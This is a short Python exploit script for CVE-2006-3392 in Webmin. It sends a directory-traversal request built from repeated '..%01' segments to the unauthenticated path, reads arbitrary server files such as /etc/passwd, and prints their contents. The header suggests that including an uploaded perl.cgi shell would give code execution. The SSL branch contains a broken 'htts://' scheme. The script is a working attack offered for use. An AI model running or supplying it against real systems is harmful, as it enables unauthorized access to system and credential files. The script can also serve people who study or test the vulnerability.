"""
Full Credit Goes to - Securitydot.net - for this CVE
Re-Written in Python for better implementation by Omri Baso
Aka J3wker

Original Exploit: https://www.exploit-db.com/exploits/2017

CVE: 2006-3392 

Webmin 1.290 - 1.220 CGI Include / File Disclosure

Note:

If you are able to somehow get a perl.cgi shell in the server and include it 
code will be executed.
"""
import requests, sys

if len(sys.argv) <= 3:
    print(f"[+] Usage: python3 {sys.argv[0]} <IP> <port> <file to include> <SSL/HTTP>")
    print("\nExample: python3 exploit.py http://example.com 10000 /etc/passwd SSL")
    sys.exit()

IP = str(sys.argv[1])

file_dis = sys.argv[3]

if sys.argv[2]:
    port = sys.argv[2]
else:
    port = "10000"

if sys.argv[4] == "SSL":
    r = f"htts://{IP}:{port}/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01{file_dis}"
    response = requests.get(r, verify=False)
    print(f"File Content:\n\n{response.text}")
else:
    r = f"http://{IP}:{port}/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01{file_dis}"
    response = requests.get(r)
    print(f"File Content:\n\n{response.text}")

